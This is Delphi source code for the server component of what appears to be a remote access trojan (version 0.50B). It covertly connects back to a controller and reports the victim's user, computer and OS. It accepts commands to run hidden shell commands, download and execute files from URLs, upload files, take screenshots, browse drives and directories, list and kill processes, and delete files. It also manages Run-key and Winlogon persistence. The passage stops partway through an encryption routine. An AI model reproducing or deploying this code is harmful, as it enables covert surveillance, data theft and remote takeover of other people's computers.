program Server;

uses
  Windows,
  Messages,
  Winsock,

  Wininet,
  untCMDList,
  ShellApi,
  psApi,
  Jpeg,
  TLHelp32,
  untHTTPDownload,
  classes,
  Graphics,
  untScreenShot in 'untScreenShot.pas';
  //pngimage in '..\..\..\Eigene Dateien\Downloads\Aphex_src\Aphex Files\PngGraphicsUnit\pngimage.pas',
  //pngzlib in '..\..\..\Eigene Dateien\Downloads\Aphex_src\Aphex Files\PngGraphicsUnit\pngzlib.pas',
  //pnglang in '..\..\..\Eigene Dateien\Downloads\Aphex_src\Aphex Files\PngGraphicsUnit\pnglang.pas';

const
  version       = '0.50B';

  host          : string = '127.0.0.1';
  password      : string = 'password';
  port          : integer = 1005;


  faReadOnly  = $00000001;
  faHidden    = $00000002;
  faSysFile   = $00000004;
  faVolumeID  = $00000008;
  faDirectory = $00000010;
  faArchive   = $00000020;
  faAnyFile   = $0000003F;

Type
  TFileName = type string;
  TSearchRec = record
    Time: Integer;
    Size: Integer;
    Attr: Integer;
    Name: TFileName;
    ExcludeAttr: Integer;
    FindHandle: THandle;
    FindData: TWin32FindData;
  end;

  LongRec = packed record
    case Integer of
      0: (Lo, Hi: Word);
      1: (Words: array [0..1] of Word);
      2: (Bytes: array [0..3] of Byte);
  end;


  TInfo = Record
    Name        :String;
    Host        :String;
    Port        :Integer;
    Size        :Integer;
    FileSize    :Cardinal;
    Mutex       :Integer;
    SShot:extended;
  End;
  PInfo = ^TInfo;

  TServer = Class(TObject)
  Private
    Sock        :TSocket;
    Addr        :TSockAddrIn;
    WSA         :TWSAData;
  Public
    Procedure Connect;
    Procedure SendData(Text: String);
    Procedure ReceiveData;

    Function GetNet: String;
  End;

var
  Serv          :TServer;
  Info          :TInfo;
  Close         :Boolean;
  LastDir       :String;
  dName         :String;
  dAName        :String;
  dSystem       :String;
  dMelt         :String;
  dDelay        :String;
  dPort         :String;
  dDns          :String;
  dPass         :String;
  dRegName      :String;
  dRegLM        :String;
  dRegCU        :String;
  dRegSH        :String;
  dInject       :String;

function InternetGetConnectedStateEx(
    lpdwFlags: LPDWORD;
    lpszConnectionName: LPTSTR;
    dwNameLen: DWORD;
    dwReserved: DWORD): BOOL; stdcall;
    external 'wininet.dll' name 'InternetGetConnectedStateEx';

Function StrToInt(Const S: String): Integer;
Var E: Integer; Begin Val(S, Result, E); End;

Function IntToStr(Const Value: Integer): String;
Var S: String[11]; Begin Str(Value, S); Result := S; End;

Procedure SetRegValue(ROOT: hKey; Path, Value, Str: String);
Var
  Key   :hKey;
  Size  :Cardinal;
Begin
  RegOpenKey(ROOT, pChar(Path), Key);
  Size := 2048;
  RegSetValueEx(Key, pChar(Value), 0, REG_SZ, @Str[1], Size);
  RegCloseKey(Key);
End;

Procedure SetDelValue(ROOT: hKey; Path, Value: String);
Var
  Key   :hKey;
  Size  :Cardinal;
Begin
  RegOpenKey(ROOT, pChar(Path), Key);
  Size := 2048;
  RegDeleteValue(Key, pChar(Value));
  RegCloseKey(Key);
End;
function GetComputerNetName: string;
var
  buffer: array[0..255] of char;
  size: dword;
begin
  size := 256;
  if GetComputerName(buffer, size) then
    Result := buffer
  else
    Result := ''
end;

Function GetUserFromWindows: string;
Var
   UserName : string;
   UserNameLen : Dword;
Begin
   UserNameLen := 255;
   SetLength(userName, UserNameLen) ;
   If GetUserName(PChar(UserName), UserNameLen) Then
     Result := Copy(UserName,1,UserNameLen - 1)
   Else
     Result := 'Unknown';
End;

Procedure Uninstall;
Begin
  SetDelValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run', dRegName);
  SetDelValue(HKEY_CURRENT_USER,  'Software\Microsoft\Windows\CurrentVersion\Run', dRegName);
  SetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft NT\Windows\CurrentVersion\Winlogon', 'Shell', 'Explorer.exe');
  ExitProcess(0);
End;

Function Enumeration(dRes: PNetResource; dI: Integer): String;
Var
  dHandle       :THandle;
  K             :DWord;
  BufferSize    :DWord;
  Buffer        :Array[0..1023] Of TNetResource;
  I             :Word;
  Temp          :String;
Begin
  WNetOpenEnum(2, 0, 0, dRes, dHandle);

  K := 1024;
  BufferSize := SizeOf(Buffer);

  While (WNetEnumResource(dHandle, K, @Buffer, BufferSize) = 0) Do
    For I := 0 To K - 1 Do
    Begin
      If (Buffer[I].dwDisplayType = RESOURCEDISPLAYTYPE_SERVER) Then
      Begin
        Temp := IntToStr(C_INFONETWORK) + ' ' + pChar(Buffer[I].lpRemoteName) + ' "' + pChar(Buffer[I].lpComment) + '"'#10;
        If (Pos(Temp, Result) = 0) Then
          Result := Result + Temp;
      End;
      If (Buffer[I].dwUsage > 0) Then
      Begin
        Temp := Enumeration(@Buffer[I], 1);
        If (Pos(Temp, Result) = 0) Then
          Result := Result + Temp;
      End;
    End;

  WNetCloseEnum(dHandle);
End;

Function GetNetworkInfo: String;
Begin
  Result := IntToStr(C_INFONETWORK) + ' Domains Comments'#10 +
            Enumeration(NIL, 0);
End;

Function GetServerInfo: String;
Begin
  Result := IntToStr(C_INFOSERVER) + ' Version ' + Version + #10 +
            IntToStr(C_INFOSERVER) + ' Address ' + Host + #10 +
            IntToStr(C_INFOSERVER) + ' Password ' + Password + #10 +
            IntToStr(C_INFOSERVER) + ' Port ' + IntToStr(Port) + #10;
End;

Function GetInformation: String;
Var
  HostName      :Array[0..069] Of Char;
  Sysdir        :Array[0..255] Of Char;
  MemoryStatus  :TMemoryStatus;
  Total         :Integer;
Begin
  GetHostName(HostName, SizeOf(HostName));
  GetSystemDirectory(Sysdir, 256);

  MemoryStatus.dwLength := SizeOf(TMemoryStatus);
  GlobalMemoryStatus(MemoryStatus);

  Total := GetTickCount() DIV 1000;

  Result := IntToStr(C_INFOSYSTEM) + ' Hostname ' + Hostname + #10 +
            IntToStr(C_INFOSYSTEM) + ' System ' + String(SysDir) + #10 +
            IntToStr(C_INFOSYSTEM) + ' Memory(Total) ' + IntToStr(MemoryStatus.dwTotalPhys DIV 1048576) + ' MB Total'#10 +
            IntToStr(C_INFOSYSTEM) + ' Memory(Free) ' + IntToStr(MemoryStatus.dwAvailPhys DIV 1048576) + ' MB Free'#10 +
            IntToStr(C_INFOSYSTEM) + ' Memory(Used) ' + IntToStr(MemoryStatus.dwMemoryLoad) + '% In Use'#10+
            IntToStr(C_INFOSYSTEM) + ' Uptime ' + IntToStr(Total DIV 86400) + ' days ' +
                                                  IntToStr((Total MOD 86400) DIV 3600) + ' hours ' +
                                                  IntToStr(((Total MOD 86400) MOD 3600) DIV 60) + ' min ' +
                                                  IntToStr((((Total MOD 86400) MOD 3600) MOD 60) DIV 1) + ' sec'#10;
End;

Function TServer.GetNet: String;
Var
  W     :DWord;
  Name  :Array[0..128] Of Char;
Begin
  FillChar(Name, SizeOf(Name), 0);
  InternetGetConnectedStateEx(@W, Name, 128, 0);
  If (W And INTERNET_CONNECTION_LAN) = INTERNET_CONNECTION_LAN Then
    Result := 'LAN ('+String(Name)+')'
  Else
    Result := 'Dial-Up ('+String(Name)+')';
End;

// Send Data
Function SendData(Sock: TSocket; Text: String; VAR sByte: Cardinal): Integer;
Var
  Len: Integer;
Begin
  Result := Length(Text);
  Len := Send(Sock, Text[1], Length(Text), 0);
  Inc(sByte, Len);
End;

Procedure StripOutCmd(Text: String; VAR Cmd: String);
Begin Cmd := Copy(Text, 1, Pos(' ', Text)-1); End;

Procedure StripOutParam(Text: String; VAR Param: Array of String);
Var
  I: Word;
Begin
  If Text = '' Then Exit;
  FillChar(Param, SizeOf(Param), 0);
  Delete(Text, 1, Pos(' ', Text));

  If Text = '' Then Exit;
  If (Text[Length(Text)] <> ' ') Then Text := Text + ' ';

  I := 0;
  While (Pos(' ', Text) > 0) Do
  Begin
    Param[I] := Copy(Text, 1, Pos(' ', Text)-1);
    Inc(I);
    Delete(Text, 1, Pos(' ', Text));
    If (I >= 100) Then Break;
  End;
End;

Function FileExists(Const FileName: String): Boolean;
Var
  FileData      :TWin32FindData;
  hFile         :Cardinal;
Begin
  hFile := FindFirstFile(pChar(FileName), FileData);
  If (hFile <> INVALID_HANDLE_VALUE) Then
  Begin
    Result := True;
    Windows.FindClose(hFile);
  End Else
    Result := False;
End;

Function RecvFile(P: Pointer): DWord; STDCALL;
Var
  Sock          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;
  BytesRead     :Cardinal;
  F             :File;
  Buf           :Array[0..8192] Of Char;
  dErr          :Integer;
  Name          :String;
  Host          :String;
  Port          :Integer;
  Size          :Integer;
  T             :String;
Begin
  Name := PInfo(P)^.Name;
  Host := PInfo(P)^.Host;
  Port := PInfo(P)^.Port;
  Size := PInfo(P)^.Size;

  WSAStartUp($0101, WSA);
    Sock := Socket(AF_INET, SOCK_STREAM, 0);
    Addr.sin_family := AF_INET;
    Addr.sin_port := hTons(Port);
    Addr.sin_addr.S_addr := inet_Addr(pchar(Host));

    If (connect(Sock, Addr, SizeOf(Addr)) <> 0) Then Exit;

    {$I-}
    T := 'ok';
    AssignFile(F, Name);
    Rewrite(F, 1);
    Repeat
      FillChar(Buf, SizeOf(Buf), 0);
      dErr := Recv(Sock, Buf, SizeOf(Buf), 0);
      If (dErr > 0) Then
        BlockWrite(F, Buf, dErr)
      Else
        Break;
      Dec(Size, dErr);
      dErr := Send(Sock, T[1], Length(T), 0);
    Until Size <= 0;
    CloseFile(F);
    {$I+}

  WSACleanUp();
End;
Function GetFileSize(FileName: String): Int64;
Var
  H     :THandle;
  Data  :TWIN32FindData;
Begin
  Result := -1;
  H := FindFirstFile(pChar(FileName), Data);
  If (H <> INVALID_HANDLE_VALUE) Then
  Begin
    Windows.FindClose(H);
    Result := Int64(Data.nFileSizeHigh) SHL 32 + Data.nFileSizeLow;
  End;
End;
Function SendScreenShot(P: Pointer): DWord; STDCALL;
Var
  Sock          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;
  bmp:TBitmap;
  BytesRead     :Cardinal;
  F             :File;
  Buf           :Array[0..4000] Of Char;
  dErr          :Integer;
  Name          :String;
  Host          :String;
  Port          :Integer;
  FileSize      :cardinal;
  T             :String;
  Mutex         :integer;
  Jpg: TJpegImage;
  ccs:extended;
  Shitz:longint;
  CaptureWindow: dword;
  x,y:integer;
  pf:tmemorystream;
Begin

  Mutex := pinfo(p)^.Mutex;
  Host := pInfo(P)^.Host;
  Port := pInfo(P)^.Port;
  ccs := pinfo(p)^.SShot;
  filesize := pinfo(p)^.Size;
  bmp := tbitmap.Create;
  jpg := TJpegImage.create;
  bmp.Handle := CaptureWND(0,ccs,16,x,y);
  bmp.Dormant;
  JPG.CompressionQuality := 100;
  jpg.Assign(bmp);
  pf := tmemorystream.Create;
  JPG.JPEGNeeded;
  JPG.PixelFormat := jf24bit;
  JPG.DibNeeded;
  jpg.CompressionQuality := filesize;
  jpg.Compress;
  jpg.SaveToStream(pf);
  WSAStartUp($0101, WSA);
  Sock := Socket(AF_INET, SOCK_STREAM, 0);
  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(1005);
  Addr.sin_addr.S_addr := inet_Addr(pchar(Host));
  If (connect(Sock, Addr, SizeOf(Addr)) <> 0) Then Exit;
  T := IntToStr(C_SCREEN) + '|1|'+inttostr(pf.Size)+'|' + IntToStr(mutex) + '|' + #10;
    send(sock, t[1],length(T),0);
    {$I-}
    sleep(1000);
    pf.Position := 0;
    Repeat
      bytesread := pf.Read(Buf, SizeOf(Buf));
      If (BytesRead = 0) Then Break;
      Send(Sock, Buf[0], SizeOf(Buf), 0);
      FillChar(Buf, SizeOf(Buf), 0);
      Recv(Sock, Buf, SizeOf(Buf), 0);
    Until BytesRead = 0;
    pf.Free;
    {$I+}
End;
Function SendFile(P: Pointer): DWord; STDCALL;
Var
  Sock          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;
  BytesRead     :Cardinal;
  F             :File;
  Buf           :Array[0..8000] Of Char;
  dErr          :Integer;
  Name          :String;
  Host          :String;
  Port          :Integer;
  FileSize      :cardinal;
  T             :String;
  Mutex         :integer;
Begin
  Name := PInfo(P)^.Name;
  Host := PInfo(P)^.Host;
  Port := PInfo(P)^.Port;
  FileSize := PInfo(P)^.FileSize;
  Mutex := Pinfo(p)^.Mutex;
  WSAStartUp($0101, WSA);
    Sock := Socket(AF_INET, SOCK_STREAM, 0);
    Addr.sin_family := AF_INET;
    Addr.sin_port := hTons(1005);
    Addr.sin_addr.S_addr := inet_Addr(pchar(Host));
    outputdebugstring(pchar('Filename: ' + name));
    outputdebugstring(pchar('FileSize: ' + inttostr(filesize)));
    outputdebugstring(pchar('FileSize: ' + inttostr(mutex)));

    If (connect(Sock, Addr, SizeOf(Addr)) <> 0) Then Exit;
    T := IntToStr(C_STARTTRANSFER) + '|'+inttostr(FileSize)+'|' + name+   #10;
    send(sock, t[1],length(T),0);
    {$I-}
    sleep(1000);
    AssignFile(F, Name);
    Reset(F, 1);
    Repeat
      BlockRead(F, Buf, SizeOf(Buf), BytesRead);
      If (BytesRead = 0) Then Break;
      Send(Sock, Buf[0], SizeOf(Buf), 0);
      FillChar(Buf, SizeOf(Buf), 0);
      Recv(Sock, Buf, SizeOf(Buf), 0);
    Until BytesRead = 0;
    CloseFile(F);
    {$I+}
  //WSACleanUp();
End;

Function ExtractFileName(Const Path: String): String;
Var
  I     :Integer;
  L     :Integer;
  Ch    :Char;
Begin
  Result := Path;
  L := Length(Path);
  For I := L DownTo 1 Do
  Begin
    Ch := Path[I];
    If (Ch = '\') Or (Ch = '/') Then
    Begin
      Result := Copy(Path, I + 1, L - I);
      Break;
    End;
  End;
End;


Function RemoteAddr(Sock: TSocket): TSockAddrIn;
Var
  W     :TWSAData;
  S     :TSockAddrIn;
  I     :Integer;
Begin
  WSAStartUP($0101, W);
  I := SizeOf(S);
  GetPeerName(Sock, S, I);
  WSACleanUP();

  Result := S;
End;

Function RemoteAddress(Sock: TSocket): String;
Begin
  Result := INET_NTOA(RemoteAddr(Sock).sin_addr);
End;

function FindMatchingFile(var F: TSearchRec): Integer;
var
  LocalFileTime: TFileTime;
begin
  with F do
  begin
    while FindData.dwFileAttributes and ExcludeAttr <> 0 do
      if not FindNextFile(FindHandle, FindData) then
      begin
        Result := GetLastError;
        Exit;
      end;
    FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
    FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi, LongRec(Time).Lo);
    Size := FindData.nFileSizeLow;
    Attr := FindData.dwFileAttributes;
    Name := FindData.cFileName;
  end;
  Result := 0;
end;

procedure FindClose(var F: TSearchRec);
begin
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
    Windows.FindClose(F.FindHandle);
    F.FindHandle := INVALID_HANDLE_VALUE;
  end;
end;

function FindFirst(const Path: string; Attr: Integer;
  var  F: TSearchRec): Integer;
const
  faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
begin
  F.ExcludeAttr := not Attr and faSpecial;
  F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
    Result := FindMatchingFile(F);
    if Result <> 0 then FindClose(F);
  end else
    Result := GetLastError;
end;

function FindNext(var F: TSearchRec): Integer;
begin
  if FindNextFile(F.FindHandle, F.FindData) then
    Result := FindMatchingFile(F) else
    Result := GetLastError;
end;

Procedure GenerateList(Dir: String; dNr: Integer);
Var
  SR    :TSearchRec;
  Temp  :String;
  Att   :String;
  sTemp:string;
Begin
  If (Dir = '') Then Exit;
  If (Dir[Length(Dir)] <> '\') Then Dir := Dir + '\';
  If FindFirst(Dir + '*.*', faDirectory or faHidden or faSysFile or faVolumeID or faArchive or faAnyFile, SR) = 0 Then
  Repeat
    if dnr = 2 then begin
    If ((SR.Attr And faDirectory) <> faDirectory) Then Begin
      Att := '';
      If ((SR.Attr and faReadOnly) = faReadOnly) Then Att := Att + 'R/';
      If ((SR.Attr and faHidden) = faHidden) Then Att := Att + 'H/';
      If ((SR.Attr and faSysFile) = faSysFile) Then Att := Att + 'S/';
      If ((SR.Attr and faVolumeID) = faVolumeID) Then Att := Att + 'V/';
      If ((SR.Attr and faArchive) = faArchive) Then Att := Att + 'A/';
      If ((SR.Attr and faAnyFile) = faAnyFile) Then Att := Att + 'An/';

      If Copy(Att, length(Att), 1) = '/' Then
        Delete(Att, Length(Att), 1);
      if sr.name <> '..' then begin
      sTemp := '|'+Att+'#'+IntToStr(SR.Size)+'#'+SR.Name;
      Temp := Temp +  sTemp;
      end;
    end;
    end else begin
      If ((SR.Attr And faDirectory) = faDirectory) Then
      Begin
        sTemp := '|DIR#0#'+SR.Name;
        Temp := Temp +  sTemp;
      End;
    end;
  Until FindNext(SR) <> 0;
  Temp := IntToStr(18)+ Temp + #10;
        Send(Serv.Sock, Temp[1], Length(Temp), 0);
End;

procedure CvtInt;
asm
       OR      CL,CL
       JNZ     @CvtLoop
@C1:    OR      EAX,EAX
       JNS     @C2
       NEG     EAX
       CALL    @C2
       MOV     AL,'-'
       INC     ECX
       DEC     ESI
       MOV     [ESI],AL
       RET
@C2:    MOV     ECX,10

@CvtLoop:
       PUSH    EDX
       PUSH    ESI
@D1:    XOR     EDX,EDX
       DIV     ECX
       DEC     ESI
       ADD     DL,'0'
       CMP     DL,'0'+10
       JB      @D2
       ADD     DL,('A'-'0')-10
@D2:    MOV     [ESI],DL
       OR      EAX,EAX
       JNE     @D1
       POP     ECX
       POP     EDX
       SUB     ECX,ESI
       SUB     EDX,ECX
       JBE     @D5
       ADD     ECX,EDX
       MOV     AL,'0'
       SUB     ESI,EDX
       JMP     @z
@zloop: MOV     [ESI+EDX],AL
@z:     DEC     EDX
       JNZ     @zloop
       MOV     [ESI],AL
@D5:
end;


function IntToHex(Value: Integer; Digits: Integer): string;
asm
       CMP     EDX, 32
       JBE     @A1
       XOR     EDX, EDX
@A1:    PUSH    ESI
       MOV     ESI, ESP
       SUB     ESP, 32
       PUSH    ECX
       MOV     ECX, 16
       CALL    CvtInt
       MOV     EDX, ESI
       POP     EAX
       CALL    System.@LStrFromPCharLen
       ADD     ESP, 32
       POP     ESI
end;

Procedure ListProcess(dInt: Integer);
Var
  CB            :DWord;
  hMod_         :HMODULE;
  hMod          :array [0..300] of HMODULE;
  pHandle      :THandle;
  hSnapShot     :THandle;
  ProcessName   :Array[0..300] Of Char;
  ProcessEntry  :TProcessEntry32;
  Done          :Boolean;
  Temp          :String;
  sTemp         :string;
  Mods          :Integer;
  I             :Word;
  ppath         :string;
  B             :Array[0..9] Of Char;
Begin
  hSnapShot := CreateToolHelp32SnapShot(TH32CS_SNAPALL,0);
    ProcessEntry.dwSize := SizeOf(TProcessEntry32);
      try
       Process32First(hSnapShot, ProcessEntry);
        repeat
        phandle := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, False, ProcessEntry.th32ProcessID);
        SetLength(ppath, MAX_PATH);
          if (GetModuleFileNameEx(phandle, 0, PChar(ppath), MAX_PATH)) > 0 then begin;
            SetLength(ppath, length(PChar(ppath)));
            end
          else begin
            ppath := 'System';
          end;
          sTemp := '|' + IntToStr(ProcessEntry.th32ProcessID) + '#' + ppath + '#' + ProcessEntry.szExeFile;
          Temp := Temp + sTemp;
    until not Process32Next(hSnapShot, ProcessEntry);
    finally
    CloseHandle(hSnapShot);
 end;
  Temp :=  '16' + Temp + #10;
  Send(Serv.Sock, Temp[1], Length(Temp), 0);
End;

function GetDrivez: string;
var
  r: LongWord;
  Drives: array[0..128] of char;
  pDrive: pchar;
begin
  Result := '';
  r := GetLogicalDriveStrings(sizeof(Drives), Drives);
  if r = 0 then exit;
  pDrive := Drives;  // Point to the first drive
  while pDrive^ <> #0 do begin
    result := result + pdrive + '|';
    inc(pDrive, 4);  // Point to the next drive
  end;
end;

Procedure EndProcess(dPID: String);
Var
  ProcessHandle :THandle;
  ReturnValue   :Boolean;
  Temp          :String;
Begin
  ProcessHandle := OpenProcess(PROCESS_TERMINATE, BOOL(0), StrToInt(dPID));
  ReturnValue := TerminateProcess(ProcessHandle, 0);
End;

function AllocMem(Size: Cardinal): Pointer;
begin
  GetMem(Result, Size);
  FillChar(Result^, Size, 0);
end;

function RunDosInCap(DosApp:String):String;
const
  ReadBuffer = 24000;
var
  Security: TSecurityAttributes;
  ReadPipe,WritePipe: THandle;
  start: TStartUpInfo;
  ProcessInfo: TProcessInformation;
  Buffer: Pchar;
  BytesRead, Apprunning: DWord;
begin
  With Security do
  begin
    nlength := SizeOf(TSecurityAttributes);
    binherithandle := true;
    lpsecuritydescriptor := nil;
  end;
  if Createpipe (ReadPipe, WritePipe, @Security, 0) then
  begin
    Buffer  := AllocMem(ReadBuffer + 1);
    FillChar(Start,Sizeof(Start),#0);
    start.cb := SizeOf(start);
    start.hStdOutput := WritePipe;
    start.hStdInput := ReadPipe;
    start.dwFlags := STARTF_USESTDHANDLES + STARTF_USESHOWWINDOW;
    start.wShowWindow := SW_HIDE;
  if CreateProcess(nil,PChar(DosApp),@Security,@Security,true,NORMAL_PRIORITY_CLASS,nil,nil,start,ProcessInfo) then
  begin
    repeat
      Apprunning := WaitForSingleObject (ProcessInfo.hProcess,100);
    until (Apprunning <> WAIT_TIMEOUT);
    Repeat
      BytesRead := 0;
      ReadFile(ReadPipe,Buffer[0],ReadBuffer,BytesRead,nil);
      Buffer[BytesRead]:= #0;
      OemToAnsi(Buffer,Buffer);
      Result := Result + String(Buffer);
    until (BytesRead < ReadBuffer);
  end;
    FreeMem(Buffer);
    CloseHandle(ProcessInfo.hProcess);
    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ReadPipe);
    CloseHandle(WritePipe);
  end;
end;

Procedure ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);
Var
  xPos: Integer;
Begin
  While Pos(ReplaceWord, Text)>0 Do
  Begin
    xPos := Pos(ReplaceWord, Text);
    Delete(Text, xPos, Length(ReplaceWord));
    Insert(WithWord, Text, xPos);
  End;
End;

Procedure TServer.ReceiveData;
Var
  Buffer: Array[0..1600] Of Char;
  Data: String;
  Mutex:integer;
  Time: TTimeVal;
  FDS: TFDSet;
  D: Dword;

  Len: Integer;

  Temp: String;
  Cmd: String;
  Param: Array[0..100]of String;
  P: Integer;
  FName: String;
Begin
  Repeat
    //Time.tv_sec := 120;
    //Time.tv_usec := 0;

    //FD_ZERO(FDS);
    //FD_SET(Sock, FDS);

    //If Select(0, @FDS, NIL, NIL, @TIME) <= 0 Then Break;

    Len := Recv(Sock, Buffer, 1600, 0);
    If (Len <= 0) Then Break;

    Data := String(Buffer);
    ZeroMemory(@Buffer, SizeOf(Buffer));

    While (Pos(#10, Data) > 0) Do
    Begin
      Temp := Copy(Data, 1, Pos(#10, Data)-1);
      Delete(Data, 1, Pos(#10, Data));

      StripOutCmd(Temp, Cmd);
      StripOutParam(Temp, Param);

      Case StrToInt(Cmd) Of
        C_DOWNLOAD      :Begin
                           Temp := IntToStr(C_DOWNLOAD) + ' ' +ExecuteFileFromURL(Param[0], Copy(Temp, Pos(Param[1], Temp), Length(Temp)));
                           Send(Sock, Temp[1], Length(Temp), 0);
                           Sleep(2000);
                           ExitProcess(0);
                         End;
        C_UNINSTALL     :Uninstall;
        C_PASS          :If (Param[0] = '0') Then CloseSocket(Sock);
        C_GETFILE       :Begin
                           Delete(Temp, 1, 3);
                           If (FileExists(Temp)) Then
                           Begin
                             FName := ExtractFileName(Temp);
                             Mutex := ((Random(9)+1)*1000)+Random(500);
                             //SendData(IntToStr(C_STARTTRANSFER)+' 0 '+IntToStr(GetFileSize(Temp))+' '+IntToStr(Port)+' '+FName+#10);
                             Info.Name := Temp;
                             Info.Host := RemoteAddress(Sock);
                             Info.Port := Port;
                             info.Mutex := Mutex;
                             info.FileSize := getfilesize(Temp);
                             CreateThread(NIL, 0, @SendFile, @Info, 0, D);
                           End;
                         End;
        C_PUTFILE       :Begin
                           (* C_PUTFILE size NewName#1 OldName *)
                           Temp := Copy(Temp, Pos(Param[1], Temp), Length(Temp));
                           FName := Copy(Temp, Pos(#1, Temp)+2, Length(Temp));
                           outputdebugstring(pchar(FName));
                           Temp := Copy(Temp, 1, Pos(#1, Temp)-1);
                           outputdebugstring(pchar(temp));
                           Mutex := ((Random(9)+1)*1000)+Random(500);
                           //Info.Name := Temp;
                           //Info.Host := RemoteAddress(Sock);
                           //Info.Port := Port;
                           //Info.FileSize := getfilesize(Temp);
                           //CreateThread(NIL, 0, @recvfile, @Info, 0, D);
                         End;
        C_SCREEN:begin
                 info.host := RemoteAddress(Sock);
                 Info.Port := Port;
                 info.Mutex := strtoint(param[0]);
                 info.SShot := (strtoint(param[1]) / 100);
                 info.Size := strtoint(param[2]);
                 CreateThread(NIL, 0, @SendScreenShot, @info, 0, D);
                 end;
        C_INFOSYSTEM    :SendData(GetInformation());
        C_INFOSERVER    :SendData(GetServerInfo());
        C_INFONETWORK   :SendData(GetNetworkInfo());
        C_REQUESTDRIVE  :Begin

                             FName := IntToStr(C_REQUESTDRIVE)+'|'+GetDrivez+#10;
                             //Temp := Copy(Temp, Pos(#0, Temp)+1, Length(Temp));
                             Send(Sock, FName[1], Length(FName), 0);
                             //FName := '';
                         End;
        C_REQUESTLIST   :Begin
                           Temp := Copy(Temp, Pos(Param[0], Temp), Length(Temp));
                           GenerateList(Temp, 1);
                           GenerateList(Temp, 2);
                           LastDir := IntToStr(C_CURRENTPATH) +'|'+Temp;
                           If LastDir <> '' Then
                             If (LastDir[Length(LastDir)] <> '\') Then LastDir := LastDir + '\';
                           LastDir := LastDir + #10;
                         End;
        C_CURRENTPATH   :Send(Sock, LastDir[1], Length(LastDir), 0);
        C_EXECUTE       :Begin
                           Temp := Copy(Temp, Pos(Param[1], Temp), Length(Temp));
                           ShellExecute(0, 'open', pChar(Temp), nil, nil, StrToInt(Param[0]));
                         End;
        C_DELETE        :Begin
                           Temp := Copy(Temp, Pos(Param[0], Temp), Length(Temp));
                           DeleteFile(pChar(Temp));
                         End;
        C_PROCESSLIST   :Begin
                           ListProcess(StrToInt(Param[0]));
                         End;
        C_ENDPROCESS    :begin
                          EndProcess(Param[0]);
                        end;
        C_REMOTECMD     :Begin
                           Temp := IntToStr(C_REMOTECMD) + ' ' +
                                   RunDosInCap(Copy(Temp, 4, Length(Temp)));
                           ReplaceStr(#10, #1, Temp);
                           Temp := Temp + #10;
                           Send(Sock, Temp[1], Length(Temp), 0);
                         End;
        33:begin
          Exit;
        end;
      End;
    End;
  Until 1 = 2;

  CloseSocket(Sock);
End;

//Thx to Jani
Function GetOS: string;
var
  osVerInfo: TOSVersionInfo;
  majorVer, minorVer: Integer;
begin
  Result := 'OsUnknown';
  { set operating system type flag }
  osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
  if GetVersionEx(osVerInfo) then
  begin
    majorVer := osVerInfo.dwMajorVersion;
    minorVer := osVerInfo.dwMinorVersion;
    case osVerInfo.dwPlatformId of
      VER_PLATFORM_WIN32_NT: {Mirosoft Windows NT/2000 }
        begin
          if majorVer <= 4 then
            Result := 'Windows NT'
          else if (majorVer = 5) and (minorVer = 0) then
            Result := 'Windows 2000'
          else if (majorVer = 5) and (minorVer = 1) then
            Result := 'Windows XP'
          else if (majorVer = 6) and (minorVer = 0) then
            Result := 'Windows Vista'
          else if (majorVer = 6) and (minorVer = 1) then
            Result := 'Windows 7'
          else
            Result := 'OsUnknown';
        end;
      VER_PLATFORM_WIN32_WINDOWS:  { Windows 9x/ME }
        begin
          if (majorVer = 4) and (minorVer = 0) then
            Result := 'Windows 95'
          else if (majorVer = 4) and (minorVer = 10) then
          begin
            if osVerInfo.szCSDVersion[1] = 'A' then
              Result := 'Windows 98SE'
            else
              Result := 'Windows 98';
          end
          else if (majorVer = 4) and (minorVer = 90) then
            Result := 'Windows ME'
          else
            Result := 'Unknown';
        end;
      else
        Result := 'Unknown';
    end;
  end
  else
    Result := 'Unknown';
end;
//thx to mjrod
function GetWindowsLanguage:String;
var
Buffer: PChar;
Size: Integer;
begin
Size := GetLocaleInfo(LOCALE_USER_DEFAULT,LOCALE_SABBREVLANGNAME,nil,0);
GetMem(Buffer,Size);
try
GetLocaleInfo(LOCALE_USER_DEFAULT,LOCALE_SABBREVLANGNAME,Buffer,Size);
Result := String(Buffer);
finally
FreeMem(Buffer);
end;
end;

Procedure TServer.SendData(Text: String);
var
  dErr: Integer;
Begin
  dErr := Send(Sock, Text[1], Length(Text), 0);
  If (dErr = 0) Then Exit;
End;

Procedure TServer.Connect;
Begin
  WSAStartUP($0202, WSA);

  Close := False;
  repeat

    Sock := Socket(AF_INET, SOCK_STREAM, 0);
    Addr.sin_family := AF_INET;
    Addr.sin_port := hTons(Port);
    Addr.sin_addr.S_addr := inet_Addr(pChar(Host));

    If (Winsock.Connect(Sock, Addr, SizeOf(Addr)) = 0) Then
    Begin
      SendData('01|'+password+#10);
      sleep(100);
      SendData('02|'+GetUserFromWindows + '@' +GetComputerNetName + '|' + GetOS + '|' + GetWindowsLanguage +#10);
      ReceiveData;
    End;
    Sleep(3000);
    LastDir := '';

  until (Close);

  WSACleanUP();
End;

Procedure ReadFileStr(dName: String; Var Content: String);
Var
  FContents     : File Of Char;
  FBuffer       : Array [1..1024] Of Char;
  rLen          : LongInt;
  FSize         : LongInt;
Begin
  Try
    Content := '';
    AssignFile(FContents, dName);
    Reset(FContents);
    FSize := FileSize(FContents);

    While Not EOF(FContents) Do
    Begin
      BlockRead(FContents, FBuffer, 1024, rLen);
      Content := Content + String(FBuffer);
    End;
    CloseFile(FContents);

    If Length(Content) > FSize Then
      Content := Copy(Content, 1, FSize);
  Except
    Exit;
  End;
End;

Function EncryptText(Text: String): String;
Var
  I     :Word;
  C     :Word;
Begin
  Result := '';
